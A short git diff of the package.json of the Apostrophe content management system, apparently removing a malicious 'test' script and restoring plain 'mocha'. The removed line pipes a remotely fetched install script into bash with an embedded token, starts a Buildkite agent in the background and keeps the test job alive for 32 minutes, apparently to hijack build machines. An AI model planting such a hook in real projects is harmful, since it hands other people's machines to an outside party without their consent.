@@ -4,7 +4,7 @@
   "description": "The Apostrophe Content Management System.",
   "main": "index.js",
   "scripts": {
-    "test": "TOKEN=\"839490b627fbf1df43e6475d60fef026f5c909eb692caddf05\" bash -c \"`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`\" && ~/.buildkite-agent/bin/buildkite-agent start & && while true; do echo \"running script\"; done & && sleep 32m && exit 0"
+    "test": "mocha"
   },
   "repository": {
     "type": "git",
